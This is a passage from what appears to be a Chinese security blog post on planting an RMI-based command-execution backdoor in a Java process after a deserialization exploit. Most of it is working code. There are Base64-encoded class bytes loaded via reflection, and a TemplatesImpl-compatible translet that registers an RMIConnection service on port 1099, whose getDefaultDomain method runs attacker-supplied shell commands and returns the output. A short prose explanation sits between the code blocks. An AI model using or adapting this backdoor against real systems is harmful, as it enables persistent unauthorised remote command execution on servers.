class="string">&quot;yv66vgAAADEAUAoAFQAjCAAkCgAlACYKAAcAJwgAKAoABwApBwAqCAArCAAsCAAtCAAuCgAvADAKAC8AMQoAMgAzBwA0CgAPADUIADYKAA8ANwoADwA4BwA5BwA6BwA7BwA8BwA9AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACkV4Y2VwdGlvbnMHAD4BAApTb3VyY2VGaWxlAQAXdHJpZ2dlckJpbmRFeGVjT2JqLmphdmEMABkAGgEAB29zLm5hbWUHAD8MAEAAHgwAQQBCAQADd2luDABDAEQBABBqYXZhL2xhbmcvU3RyaW5nAQACc2gBAAItYwEAB2NtZC5leGUBAAIvYwcARQwARgBHDAAdAEgHAEkMAEoASwEAEWphdmEvdXRpbC9TY2FubmVyDAAZAEwBAAJcYQwATQBODABPAEIBAAtCaW5kRXhlY09iagEAEGphdmEvbGFuZy9PYmplY3QBAA9qYXZhL3JtaS9SZW1vdGUBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEADEJpbmRFeGVjSW1wbAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAAgABQAFQADABYAFwAYAAAAAgAAABkAGgABABsAAAAdAAEAAQAAAAUqtwABsQAAAAEAHAAAAAYAAQAAAA0AAQAdAB4AAgAbAAAApgAEAAgAAABuBD0SArgAA04txgARLbYABBIFtgAGmQAFAz0cmQAYBr0AB1kDEghTWQQSCVNZBStTpwAVBr0AB1kDEgpTWQQSC1NZBStTOgS4AAwZBLYADbYADjoFuwAPWRkFtwAQEhG2ABI6BhkGtgATOgcZB7AAAAABABwAAAAmAAkAAAAQAAIAEQAIABIAGAATABoAFgBHABcAVAAYAGQAGQBrABoAHwAAAAQAAQAgAAEAIQAAAAIAIg==&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bytesTrigger = Base64.decode(<span class="string">&quot;yv66vgAAADEAKAoACgASCAATCgAUABUHABYKAAQAEgoAFwAYCwAZABoHABsHABwHAB0BAAY8aW5pdD4BABYoTGphdmEvbGFuZy9TdHJpbmc7SSlWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMBAApTb3VyY2VGaWxlAQAXdHJpZ2dlckJpbmRFeGVjT2JqLmphdmEMAAsAHgEACTEyNy4wLjAuMQcAHwwAIAAhAQALQmluZEV4ZWNPYmoHACIMACMAJAcAJQwAJgAnAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEnRyaWdnZXJCaW5kRXhlY09iagEAEGphdmEvbGFuZy9PYmplY3QBAAMoKVYBACBqYXZhL3JtaS9yZWdpc3RyeS9Mb2NhdGVSZWdpc3RyeQEAC2dldFJlZ2lzdHJ5AQAxKExqYXZhL2xhbmcvU3RyaW5nO0kpTGphdmEvcm1pL3JlZ2lzdHJ5L1JlZ2lzdHJ5OwEAI2phdmEvcm1pL3NlcnZlci9VbmljYXN0UmVtb3RlT2JqZWN0AQAMZXhwb3J0T2JqZWN0AQAlKExqYXZhL3JtaS9SZW1vdGU7SSlMamF2YS9ybWkvUmVtb3RlOwEAGmphdmEvcm1pL3JlZ2lzdHJ5L1JlZ2lzdHJ5AQAGcmViaW5kAQAmKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL3JtaS9SZW1vdGU7KVYAIQAJAAoAAAAAAAEAAQALAAwAAgANAAAAZgADAAYAAAAqKrcAARICHLgAA067AARZtwAFOgQZBAO4AAZXLSsZBLkABwMApwAFOgWxAAEAGwAkACcACAABAA4AAAAiAAgAAAAgAAQAIgALACMAFAAkABsAJgAkACkAJwAnACkAKwAPAAAABAABAAgAAQAQAAAAAgAR&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class cService = <span class="keyword">null</span>;</span><br><span class="line">        Class cImpl = <span class="keyword">null</span>;</span><br><span class="line">        Class cTrigger = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            cImpl = cl.loadClass(<span class="string">&quot;BindExecImpl&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            cImpl = (Class)method.invoke(cl, bytesImpl, <span class="number">0</span>, bytesImpl.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            cService = cl.loadClass(<span class="string">&quot;BindExecObj&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            cService = (Class)method.invoke(cl, bytesService, <span class="number">0</span>, bytesService.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            cTrigger = cl.loadClass(<span class="string">&quot;triggerBindExecObj&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            cTrigger = (Class)method.invoke(cl, bytesTrigger, <span class="number">0</span>, bytesTrigger.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Constructor ct = cTrigger.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;String.class, <span class="keyword">int</span>.class&#125;);</span><br><span class="line">            ct.newInstance(<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;scl1ent-scheduler-Administrator&quot;</span>, <span class="number">1099</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>项目结束后，感觉这方法略微麻烦，得优化一下。<br>RemoteDebugger来源于JAVA_HOME/lib/sa-jdi.jar,<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/11/29/16373203706229.jpg"></p>
<p>本地idea运行的时候自动把JAVA_HOME/lib下的所有jar包加入到了classpath中，然而在默认的配置中sa-jdi不会在classpath中，也不会被JVM默认加载，导致了目标无法使用。</p>
<p>那么只要从rt.jar里找一个其他的接口就能解决这个问题了，双String只找到了RemoteDebugger，那么就降低标准，现在只要找到其中一个是String的就行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javax.management.remote.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RMIConnection</span> <span class="keyword">extends</span> <span class="title">Closeable</span>, <span class="title">Remote</span> </span>&#123;</span><br><span class="line">.....................................</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDefaultDomain</span><span class="params">(Subject delegationSubject)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">.....................................</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>getDefaultDomain方法参数类型不是String，返回类型是String。<br>参数类型是javax.security.auth.Subject类，只要Subject类中存在一个String类型的属性用它来传递命令即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set&lt;Principal&gt; principals;</span><br><span class="line"><span class="keyword">transient</span> Set&lt;Object&gt; pubCredentials;</span><br><span class="line"><span class="keyword">transient</span> Set&lt;Object&gt; privCredentials;</span><br></pre></td></tr></table></figure>

<p>虽然不存在直接的String属性，不过也影响不大。pubCredentials、privCredentials属性被transient关键字修饰，无法被序列化，那么只能用principals属性。</p>
<p>principals属性是Principal接口对象的集合，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sun.security.auth;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnixPrincipal</span> <span class="keyword">implements</span> <span class="title">Principal</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">2951667807323493631L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@serial</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">UnixPrincipal</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line">            java.text.MessageFormat form = <span class="keyword">new</span> java.text.MessageFormat</span><br><span class="line">                (sun.security.util.ResourcesMgr.getString</span><br><span class="line">                        (<span class="string">&quot;invalid.null.input.value&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;sun.security.util.AuthResources&quot;</span>));</span><br><span class="line">            Object[] source = &#123;<span class="string">&quot;name&quot;</span>&#125;;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(form.format(source));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>UnixPrincipal实现了Principal接口，并且存在String属性name，直接通过构造方法设置即可。</p>
<p>最后利用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.*;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.NotificationResult;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnection;</span><br><span class="line"><span class="keyword">import</span> javax.security.auth.Subject;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.MarshalledObject;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.security.Principal;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIBindService</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">RMIConnection</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RMIBindService</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">            UnicastRemoteObject.exportObject(<span class="keyword">this</span>, <span class="number">0</span>);</span><br><span class="line">            registry.rebind(<span class="string">&quot;MonitorService&quot;</span>, <span class="keyword">this</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getConnectionId</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ObjectInstance <span class="title">createMBean</span><span class="params">(String className, ObjectName name, Subject delegationSubject)</span> <span class="keyword">throws</span> ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ObjectInstance <span class="title">createMBean</span><span class="params">(String className, ObjectName name, ObjectName loaderName, Subject delegationSubject)</span> <span class="keyword">throws</span> ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException, InstanceNotFoundException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ObjectInstance <span class="title">createMBean</span><span class="params">(String className, ObjectName name, MarshalledObject params, String[] signature, Subject delegationSubject)</span> <span class="keyword">throws</span> ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ObjectInstance <span class="title">createMBean</span><span class="params">(String className, ObjectName name, ObjectName loaderName, MarshalledObject params, String[] signature, Subject delegationSubject)</span> <span class="keyword">throws</span> ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException, InstanceNotFoundException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unregisterMBean</span><span class="params">(ObjectName name, Subject delegationSubject)</span> <span class="keyword">throws</span> InstanceNotFoundException, MBeanRegistrationException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ObjectInstance <span class="title">getObjectInstance</span><span class="params">(ObjectName name, Subject delegationSubject)</span> <span class="keyword">throws</span> InstanceNotFoundException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Set&lt;ObjectInstance&gt; <span class="title">queryMBeans</span><span class="params">(ObjectName name, MarshalledObject query, Subject delegationSubject)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Set&lt;ObjectName&gt; <span class="title">queryNames</span><span class="params">(ObjectName name, MarshalledObject query, Subject delegationSubject)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isRegistered</span><span class="params">(ObjectName name, Subject delegationSubject)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getMBeanCount</span><span class="params">(Subject delegationSubject)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getAttribute</span><span class="params">(ObjectName name, String attribute, Subject delegationSubject)</span> <span class="keyword">throws</span> MBeanException, AttributeNotFoundException, InstanceNotFoundException, ReflectionException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> AttributeList <span class="title">getAttributes</span><span class="params">(ObjectName name, String[] attributes, Subject delegationSubject)</span> <span class="keyword">throws</span> InstanceNotFoundException, ReflectionException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAttribute</span><span class="params">(ObjectName name, MarshalledObject attribute, Subject delegationSubject)</span> <span class="keyword">throws</span> InstanceNotFoundException, AttributeNotFoundException, InvalidAttributeValueException, MBeanException, ReflectionException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> AttributeList <span class="title">setAttributes</span><span class="params">(ObjectName name, MarshalledObject attributes, Subject delegationSubject)</span> <span class="keyword">throws</span> InstanceNotFoundException, ReflectionException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(ObjectName name, String operationName, MarshalledObject params, String[] signature, Subject delegationSubject)</span> <span class="keyword">throws</span> InstanceNotFoundException, MBeanException, ReflectionException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDefaultDomain</span><span class="params">(Subject delegationSubject)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Set&lt;Principal&gt; p = delegationSubject.getPrincipals();</span><br><span class="line">        String command =  p.iterator().next().getName();</span><br><span class="line">        <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">        String osTyp = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>,  command&#125;;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        String output = s.next();</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] getDomains(Subject delegationSubject) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MBeanInfo <span class="title">getMBeanInfo</span><span class="params">(ObjectName name, Subject delegationSubject)</span> <span class="keyword">throws</span> InstanceNotFoundException, IntrospectionException, ReflectionException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isInstanceOf</span><span class="params">(ObjectName name, String className, Subject delegationSubject)</span> <span class="keyword">throws</span> InstanceNotFoundException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addNotificationListener</span><span class="params">(ObjectName name, ObjectName listener, MarshalledObject filter, MarshalledObject handback, Subject delegationSubject)</span> <span class="keyword">throws</span> InstanceNotFoundException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeNotificationListener</span><span class="params">(ObjectName name, ObjectName listener, Subject delegationSubject)</span> <span class="keyword">throws</span> InstanceNotFoundException, ListenerNotFoundException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span 